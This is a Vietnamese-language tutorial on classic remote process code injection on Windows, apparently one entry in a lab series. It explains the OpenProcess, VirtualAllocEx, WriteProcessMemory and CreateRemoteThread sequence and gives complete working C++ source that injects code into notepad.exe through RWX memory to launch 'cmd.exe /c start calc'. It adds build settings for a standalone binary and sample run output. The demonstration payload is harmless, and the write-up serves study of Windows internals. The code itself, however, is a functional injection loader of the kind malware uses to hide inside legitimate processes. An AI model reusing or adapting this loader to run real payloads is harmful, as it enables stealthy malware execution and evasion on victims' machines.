
---

# 📝 [PE 02] Classic Code Injection — Remote Process

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Classic Code Injection tại Tiến trình Từ xa (Remote Process)** đại diện cho mô hình mở rộng biên giới thực thi của mã máy sang một không gian địa chỉ ảo cô lập. Khác với mô hình kích nổ nội tại (In-Process Context - PE 01), giải thuật này can thiệp trực tiếp vào cấu trúc bộ nhớ và chiếm dụng ngữ cảnh lập lịch (Thread Context) của một tiến trình hợp pháp khác đang vận hành trên hệ thống (ví dụ: `notepad.exe`) để thực thi khối mã máy độc lập vị trí (Position-Independent Code - PIC).

### 🎯 Mục tiêu nghiên cứu:

* **Thao túng bộ nhớ chéo tiến trình (Cross-Process Memory Manipulation)**: Nghiên cứu cơ chế bẻ gãy tính cô lập của không gian địa chỉ ảo (Virtual Address Space Isolation) được bảo vệ bởi phần cứng và hệ điều hành.
* **Khống chế luồng thực thi từ xa (Remote Thread Hijacking)**: Làm chủ cơ chế điều phối và khởi tạo Thread Subsystem của Windows Kernel nhằm cưỡng bách tiến trình mục tiêu thực thi logic ngoài danh bạ.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Rào cản lớn nhất khi can thiệp chéo tiến trình là cơ chế cô lập bộ nhớ ảo của kiến trúc bảo mật Windows. Để thiết lập bệ phóng và thực thi mã máy phẳng lọt lòng inside tiến trình đích, hệ điều hành điều phối dòng chảy qua 4 giai đoạn ngầm tại tầng nhân Kernel:

```
[OpenProcess: Khởi tạo kết nối Handle]
       └──> [VirtualAllocEx: Cấp phát trang nhớ ảo từ xa]
                 └──> [WriteProcessMemory: Bơm mã máy chéo biên giới RAM]
                           └──> [CreateRemoteThread: Chiếm quyền điều phối CPU]

```

1. **Ủy quyền can thiệp (`OpenProcess`)**: Loader gửi yêu cầu lên Security Subsystem của Kernel nhằm thiết lập một tay cầm (Handle) kết nối xuyên biên giới tới tiến trình mục tiêu. Yêu cầu bắt buộc phải đính kèm các quyền đặc quyền kịch khung bao gồm: `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE` và `PROCESS_CREATE_THREAD`. Nhân Kernel thực hiện thẩm định Token bảo mật của Loader trước khi phê duyệt Handle.
2. **Phân bổ không gian ảo từ xa (`VirtualAllocEx`)**: Trình quản lý bộ nhớ mở rộng thuộc tính `Ex` cho phép Loader can thiệp vào không gian ảo của tiến trình đích thông qua Handle đã được phê duyệt. Windows Kernel tìm kiếm các trang nhớ rảnh trong cấu trúc bảng trang (Page Tables) của nạn nhân, chuyển trạng thái vùng nhớ sang `MEM_COMMIT` và lật cờ bảo vệ thành **`PAGE_EXECUTE_READWRITE` (RWX)**.
3. **Bơm dữ liệu xuyên không gian địa chỉ (`WriteProcessMemory`)**: Loader thực hiện lệnh sao chép mảng byte dữ liệu tuyệt đối cùng khối mã máy từ RAM cục bộ, đẩy qua kênh truyền Handle của nhân Kernel để ghi đè trực tiếp lên tọa độ ảo vừa được mở khóa bên lòng tiến trình đích.
4. **Cưỡng bức dòng chảy CPU (`CreateRemoteThread`)**: Windows Kernel khởi tạo một cấu trúc Thread Object hoàn toàn mới nằm lọt lòng trong danh bạ quản lý của tiến trình đích. Trình lập lịch (Scheduler) nạp địa chỉ của vùng nhớ Code Payload vào thanh ghi chỉ mục lệnh **`Rip`** của CPU, đồng thời nạp địa chỉ phân vùng chứa cấu trúc tham số tuyệt đối vào thanh ghi **`Rcx`** (Calling Convention chuẩn x64), ép CPU của tiến trình đích tự động triệu hồi thực thi logic.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt nguyên lý thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** nhằm tự động hóa việc đo đạc kích thước cấu trúc dữ liệu, đồng thời kiểm soát nghiêm ngặt mã lỗi hệ thống (Handle & Error Checking).

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// Định nghĩa cấu trúc dữ liệu con trỏ để hóa giải rào cản lỗi dịch chuyển địa chỉ tương đối
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _REMOTE_THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
} REMOTE_THREAD_DATA, *PREMOTE_THREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh logic thực thi kịch khung từ xa
DWORD WINAPI RemotePayload(LPVOID lpParam) {
    PREMOTE_THREAD_DATA pData = (PREMOTE_THREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa chức năng thông qua địa chỉ tuyệt đối độc lập vị trí nạp RAM
        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { 
                    pid = pe32.th32ProcessID; 
                    break; 
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 02: CLASSIC REMOTE PROCESS CODE INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcessName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetProcessName);
    if (dwPID == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    // 1. Mở kết nối thiết lập Handle xuyên biên giới tiến trình mục tiêu
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed! Quyen han CLI hien tai bi gioi han." << std::endl;
        return EXIT_FAILURE;
    }

    SIZE_T functionSize = 500;

    // 2. Cấp phát động các trang nhớ ảo mang thuộc tính RWX từ xa lọt lòng tiến trình đích
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = VirtualAllocEx(hProcess, NULL, sizeof(REMOTE_THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Mo trang nho Code RWX tu xa tai dia chi: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ trước khi ánh xạ sang đối phương
    REMOTE_THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // 3. Bơm song song khối mã máy phẳng và tham số dữ liệu chéo không gian ảo sang Notepad
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemotePayload, functionSize, NULL);
    WriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(REMOTE_THREAD_DATA), NULL);
    std::cout << "[+] Anh xa ma may va tham so tuyet doi sang Notepad hoan tat." << std::endl;

    // 4. Kích nổ luồng từ xa ép CPU của Notepad thực thi logic Payload
    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa logic..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
    
    if (hThread) {
        // Đồng bộ hóa luồng, Loader giữ vai trò gánh luồng xử lý dứt điểm phẳng sạch
        WaitForSingleObject(hThread, INFINITE); 
        std::cout << "[+] Remote Code Injection Successful!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] CreateRemoteThread failed! Error Code: " << GetLastError() << std::endl;
    }

    // 5. Thu hồi và giải phóng triệt để Handle hệ thống chống rò rỉ tài nguyên (Memory Leak)
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để tệp nhị phân `.exe` xuất bản đạt trạng thái độc lập hoàn toàn, bẻ gãy các lỗi thiếu thư viện DLL phụ thuộc khi vận hành độc lập trên môi trường máy ảo VM sạch hoặc Sandbox kiểm thử:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Chuyển đổi thanh cấu hình dự án sang chế độ **`Release`** và nền tảng kiến trúc **`x64`**.
2. Cấu hình cờ liên kết tĩnh hệ thống: Đi tới `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Thay đổi thuộc tính `Runtime Library` sang định dạng **`Multi-threaded (/MT)`**.

> **Vị trí đặt ảnh minh chứng cấu hình biên dịch hệ thống:**
> 

3. Tiến hành thực hiện thao tác chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng lỗi chuỗi.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng mục tiêu `Notepad.exe` trên môi trường Lab, sau đó thực thi tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô:

```powershell
PS C:\Workspace\x64\Release> .\PE02_Remote_Injection.exe
====================================================
[*] PE 02: CLASSIC REMOTE PROCESS CODE INJECTION
====================================================
[+] Da tim thay Notepad.exe voi PID: 12540
[+] Mo trang nho Code RWX tu xa tai dia chi: 0x0000019C24BF0000
[+] Anh xa ma may va tham so tuyet doi sang Notepad hoan tat.
[*] Dang khoi tao luong tu xa de khai hoa logic...
[+] Remote Code Injection Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm tiêm nhiễm chéo tiến trình:**
> 

### 🎯 Phân tích hệ quả RAM:

* Vùng không gian ảo mang cờ `RWX` được mở thành công chéo tiến trình tại địa chỉ xác định, chứng minh qua việc ghi dữ liệu tuyệt đối thành công.
* Ứng dụng Máy tính `calc.exe` bật mở rực rỡ kịch trần kịch khung dưới tư cách là tiến trình con trực tiếp của `notepad.exe` (thay vì của Loader), khẳng định giải thuật bắt cóc và thao túng dòng chảy CPU từ xa thành công mỹ mãn hoàn hảo.

---